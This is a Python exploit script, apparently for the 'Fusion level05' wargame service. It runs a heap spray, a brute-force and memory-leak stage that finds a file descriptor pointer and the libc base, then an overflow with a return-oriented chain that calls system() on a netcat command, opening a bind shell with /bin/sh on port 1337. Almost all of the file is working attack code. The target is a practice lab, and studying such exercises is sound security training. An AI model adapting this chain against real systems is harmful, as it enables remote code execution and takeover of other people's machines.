#!/usr/bin/python
import socket
import struct
import time
import telnetlib
import string
import sys
from struct import pack

# Configuration
v = ('127.0.0.1', 20005)




CMD = 'A'*20
HEAPDUMP = CMD
HEAPDUMP += 'A'*(400-len(CMD)) #
HEAPDUMP += struct.pack('I', 0x4)



#exit(0)
# Important Variables []

FD = 0
ARGU= 0
LIBC= 0

if '127.0.0' in v[0]:
	print '[*] Using local settings'
	TIMEOUT = 0.1
	SPRAYTIME = 0.00001
else:
	TIMEOUT = 0.3
	SPRAYTIME = 0.0001

# create connection
def connect(IP, PORT):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	return s

# recv bytes
def recv(s, bytes):
	s.settimeout(TIMEOUT)
	try:
		r = s.recv(bytes)
	except Exception as e:
		r = ''
	return r

# send bytes
def send(s, data, listen=False):
	s.send(data+'\n')
	if listen:
		return recv(s, 1024)
	return False


# checkname
def check(s, data, listen):
	return send(s, 'checkname '+data, listen=listen)


# addref function
def add(s, data):
	send(s, 'addreg '+data+ ' 64 1.1.7.1')
	return send(s,'checkname '+data)

# isup
def isup(s, data):
	s.send('isup {}\n'.format(data), False)
	return




"""
	Start Addr   End Addr       Size     Offset objfile
	0x8f94d000 0xb764d000 0x27d00000          0        
	0xb764d000 0xb768f000    0x42000          0        
	0xb768f000 0xb7805000   0x176000          0       /lib/i386-linux-gnu/libc-2.13.so
	0xb7805000 0xb7807000     0x2000   0x176000       /lib/i386-linux-gnu/libc-2.13.so
	0xb7807000 0xb7808000     0x1000   0x178000       /lib/i386-linux-gnu/libc-2.13.so
	0xb7808000 0xb780b000     0x3000          0        
	0xb7815000 0xb7817000     0x2000          0        
	0xb7817000 0xb7818000     0x1000          0           [vdso]
	0xb7818000 0xb7836000    0x1e000          0       /lib/i386-linux-gnu/ld-2.13.so
	0xb7836000 0xb7837000     0x1000    0x1d000       /lib/i386-linux-gnu/ld-2.13.so
	0xb7837000 0xb7838000     0x1000    0x1e000       /lib/i386-linux-gnu/ld-2.13.so
	0xb7838000 0xb783e000     0x6000          0       /opt/fusion/bin/level05
	0xb783e000 0xb783f000     0x1000     0x6000       /opt/fusion/bin/level05
	0xb783f000 0xb7842000     0x3000          0        
	0xb8110000 0xb8131000    0x21000          0           [heap]
	0xb8131000 0xbf873000  0x7742000          0           [heap]
	0xbf883000 0xbf8a4000    0x21000          0           [stack]

"""
# heap spray
def spray(s, num=0x7c685):
	print '[+] Spray Started. '
	print '[+] Please wait. Minimum Time : 50 sec | Maximum : 140+ sec'
	for i in range(num):
	       time.sleep(SPRAYTIME)
	       isup(s, HEAPDUMP)
	print '[+] Spray End..'
	return





# Finding File Descriptor 
def find_fd(s):
	print '[*] This Process Can Take Nearly 0-60 Sec.'
	rc2 = 0
	rc3 = 0
	rc1 = check(s, 'A'*20, True)
	if rc1:
		print '[+] Process Started.'
		print rc1
	else:
		print '[+] Server not Responding.'
		exit(0)
	for i in range(0xb5010101, 0xb501ffff):

		if (('\n' in struct.pack('I', i)) | ('\r' in struct.pack('I', i)) | ('@' in struct.pack('I', i)) | ('\x00' in struct.pack('I', i))):
			continue
		#sys.stdout.write('\r [+] Trying : {}'.format(hex(i)))
		#sys.stdout.flush()
		#i = 0xb601328c
		rc1 = check(s, 'A'*32+struct.pack('I', i), True)
		print '[+] Trying : ', hex(i), rc1
		#exit(0)
		if rc1:
			print '[+] May We Find It. Let me conform it.', hex(i)
			rc2 = check(s, 'B'*32+struct.pack('I', i), True)
			rc3 = check(s, 'B'*32+struct.pack('I', i), True)

			if (rc1 and rc2 and rc3):
				print [struct.pack('I', i)], hex(i)
				if raw_input('[+] Press Enter To Find Another One Or Type [Y] : '):
					return i
	return 0

# get libc address
def adjust(s, g, i):
	return int(((i >> 4) << 4)+0x42000)

# leak data analyser
def dumpcollect(s, g, ARGU, LIBC):
	offset = 4
	while True:
		i = g+offset 
		# Conditions To Avoid Bad Characters
		if (('\n' in struct.pack('I', i)) | ('\r' in struct.pack('I', i)) | ('@' in struct.pack('I', i)) | ('\x00' in struct.pack('I', i))):
			offset += 1
                        continue
		if ((ARGU!=0) and (LIBC!=0)):
			return (ARGU, LIBC)

			
		rc = check(s, 'A'*32+struct.pack('I', g)+struct.pack('I', i), True)
		if rc:
			rc = rc.replace(' is not indexed already\n', '')
			if (('taskmain' in rc) or ('skmain' in rc) or ('main' in rc)):
				print "[+] Leak Address : ",[struct.pack('I', g+offset)]
				print "[+] Leaked Data  : ",[rc]
				LIBC = adjust(s, g, i)
				print '[+] Libc Address Detected : ', hex(LIBC)
				print('[+] Congrats. Libc Found')
				if 'y' in raw_input('[+] Find Again [y/n] : '):
					LIBC = 0
				print '[+] Current ARGU Address : ', hex(ARGU)

			elif ((CMD in rc) and (not ARGU)):
				print [struct.pack('I', g+offset)]
				print [rc]
				ARGU = i
				print '[+] CMD Address : ', hex(ARGU)
				print('[+] Congrats. CMD Address Detected.')
			else:
				if len(rc):
					offset += len(rc)
				else:
					offset += 4
	return (0, 0)


# open /bin/sh
def opensh(libc, ptr, ret):
	r = ''
	r += struct.pack("I", libc + 0x3cb20) # system
	r += struct.pack("I", ret)
	r += struct.pack("I", ptr) # "/bin/sh"
	return r

def openncshell(libcbase):

	p = ""
	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178020) # @ .data
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret	
	p += "/bin"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178024) # @ .data + 4
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "/nc."
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178028) # @ .data + 8
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "trad"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x0017802c) # @ .data + 12
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "itio"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178030) # @ .data + 16
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "nal "
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178034) # @ .data + 20
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "-ltp"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178038) # @ .data + 24
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "1337"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x0017803c) # @ .data + 28
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += " -e/"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x0017803f) # @ .data + 32
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "/bin"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

	p += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
	p += pack("<I", libcbase + 0x00178043) # @ .data + 36
	p += pack("<I", 0x42424242) # padding
	p += pack("<I", libcbase + 0x000238df) # pop %eax | ret
	p += "//sh"
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
	
	p += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
	p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret
	
	p += pack("<I", libcbase + 0x0003cb20) # system()
	p += pack("<I", libcbase + 0x000329e0) # exit()
	p += pack("<I", libcbase + 0x00178020) # @ .data
	return p


def payload(esi, edi, libc, cmd):
	PAYLOAD = 'A'*32
	PAYLOAD += struct.pack('I', esi) # ESI
	PAYLOAD += struct.pack('I', edi) # EDI
	PAYLOAD += struct.pack("I", libc-0x41010) # EBP
	#PAYLOAD += opensh(libc, cmd, 0x41414141) # EIP
	PAYLOAD += openncshell(libc)
	PAYLOAD += ''
	print [PAYLOAD]
	return PAYLOAD


if __name__ == '__main__':
	if 'spray' in sys.argv:
		print '[*] Spray: ', [HEAPDUMP]

		raw_input('[+] Spary.. Now.')
		print '[+] Calm Down.. Process Take Time To Conform That Server Doesnt Crash During Spray.'
		s = connect(*v)
                time.sleep(1)
                if not recv(s, 1024):
                        print '[+] Server Is Not Responsing.,'
                        exit(0)
		else:
			print '[+] I Think Server Is Ready To Exploit.'
		# Engage Spray
		spray(s)
		s.send('quit\n'*2)
		print "[+] I think... We done it."
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		exit(0)

	elif 'crash' in sys.argv:
		raw_input('[+] Want To Crash.. Restart.')
                s = connect(*v)
                print check(s, 'A'*50, True)
                t = telnetlib.Telnet()
                t.sock = s
                t.interact()
                s.send('quit\n'*2)

	elif 'interact' in sys.argv:
                raw_input('[+] Interactive..')
                s = connect(*v)
		time.sleep(1)
		c = recv(s, 1024)
		if not c:
			print '[+] Server Is Not Responsing.,'
			exit(0)
                else:
			print c
                        print '[+] I Think Server Is Ready To Exploit.'

		print '[+] Telnet Engaged..'
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		s.send('quit\n'*2)



	elif 'leak' in sys.argv:
                raw_input('[+] Exploiting..')
                s = connect(*v)
		time.sleep(1)
		c = recv(s, 1024)
		if not c:
			print '[+] Server Is Not Responsing.,'
			exit(0)
                else:
			print c
                        print '[+] I Think Server Is Ready To Exploit.'

		# Find File Descriptor
		print '[+] Finding FD'
		g = FD or find_fd(s)

		if not g:
			print '[+] Sorry File Descriptor Not Found'
			exit(0)

		print '[+] FD Selected : ', hex(g)
		raw_input('[+] Press Enter To Second Stage.')
		print '[+] Addresses Extraction Started.'
		ARGU, LIBC = dumpcollect(s, g, ARGU, LIBC)
		if (ARGU and LIBC):
			print '[+] Data Leak Face Complete.'
			print '[-]	Information Conformation	[-]'
			print '\t[+] FD  Address  : ', hex(FD)
                        print '\t[+] Libc Address : ', hex(LIBC)
                        print '\t[+] Argu Address : ', hex(ARGU)

		else:
			s.send('quit\n'*2)
			exit(0)
		esi = FD
		cmd = ARGU
		libc = LIBC
		edi = 0xb6010101
		data = payload(esi, edi, libc, cmd)
		check(s, data, False)
		print '[+] Telnet Engaged..'
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		s.send('quit\n'*2)
	else:
		print '[+] Pass Argument Like : leak, spray, crash'


def start(args):

	# Connection Section
	s = connect(*v)
	t = telnetlib.Telnet()
	t.sock = s
	time.sleep(1)
	print recv(s, 1024)
	PAYLOAD = 'A'*32
	PAYLOAD += struct.pack('I', 0xba010101) # ESI
	PAYLOAD += '' # EDI
	PAYLOAD += '' # EBP
	PAYLOAD += '' # EIP
	PAYLOAD += ''
	print [check(s, 'checkname '+PAYLOAD, True)]
	t.interact()
